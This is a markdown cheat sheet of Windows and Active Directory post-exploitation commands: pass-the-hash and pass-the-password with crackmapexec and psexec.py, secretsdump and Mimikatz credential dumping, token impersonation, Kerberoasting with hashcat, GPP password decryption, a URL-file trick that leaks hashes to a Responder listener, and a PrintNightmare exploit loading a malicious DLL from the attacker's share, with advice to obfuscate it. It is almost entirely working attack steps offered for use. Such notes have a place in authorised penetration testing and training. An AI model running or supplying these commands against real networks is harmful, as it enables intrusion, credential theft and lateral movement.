# Post-Exploitation Attack

## Pass The Password
**Tools used**
1. crackmapexec
2. msfconsole

**CMDS:**
1. crackmapexec smb IP/CIDR -u  DomainUser -d Domain.ext -p ThePassword 
2. psexec.py DomainName.ext/DomainUser:ThePassword@IP

**Dumping Hash with secretsdump.py**
1. secretsdump.py DomainName/Domainuser:ThePassword@IP

## Pass The Hash attack

1. Get NTLM(not NTLMv2) by secretsdump.py
2. crackmapexec smb IP/CIDR -u User name -H \<hash\>
3. psexec.py "User Name":@IP -hashes LMHASH:NTHASH

## Token Impersonation
DELEGATE TOKENS ARE CREATED FROM LOGIN AND STAY TILL IMPERSONATE
1. msfconsole
2. use windows/smb/psexec
3.  set options 
4.  load -l 
5.  load incognito
6.  list_token -u/-g
7.  impersonate_token DOMAINNAME\\USERNAME
8.  shell

## Kerberoasting
1. GetUserSPN.py Domain.ext/DomainUser:Password -dc-ip IPofDC -request
2. copy the hash recieved
3. hashcat --help | grep kerberos
4. hashcat -a 0 -m 13100 hashed.txt rockyou.txt -O

## GPP or MS14-025
can use auxillary/scanner/smb/smb_enum_gpp from metasploit (but in most cases sysvol is secured so u wont get anything out of it and can only be accessed if we are a domain user.)

Enumerate to get something like Groups.xml 
extract the user name and password hash 

use gpp-decrypt hash -> get password

try to connect using psexec.py  domain.ext/domainUserName:password@ip

# URL File Attack

Open notepad on **VICTIM MACHINE**
paste this:-

```
  [InternetShortcut] 
  URL=blah 
  WorkingDirectory=blah 
  IconFile=\\x.x.x.x\%USERNAME%.icon 
  IconIndex=1 
```
change the x.x.x.x to the attack machine's ip
save the above in a shareable folder as **"\@name.url"**

**ON ATTACK MACHINE**
sudo responder -i intefaceName -v

## PrintNightmare CVE-2021-1675
1. rpcdump.py @IP \| egrep 'MS-RPRN\|MS-PAR'
2. if returns something
3. msfvenom -p payload -f dll >shell.dll
4. sudo msfconsole
5. exploit multi handler
6. set file share
7. smbserver.py share `pwd` -smb2support
8. go here:-
9. https://github.com/cube0x0/CVE-2021-1675
10. python3 CVE-2021-1675.py domain.ext/domainUser:Password@DC-IP '\\AT-IP\pathtoshell.dll\shell.dll
11.**OBFUSCATE DLL**

## Hashdump using MimiKatz
 **privilege::debug**
Following are a list of commands that can be tried 
1. lsadump::sam
2. lsadump::lsa /patch



if u have time just turn on wdigest with mimikatz and wait for someone to log into the computer
and you will have password
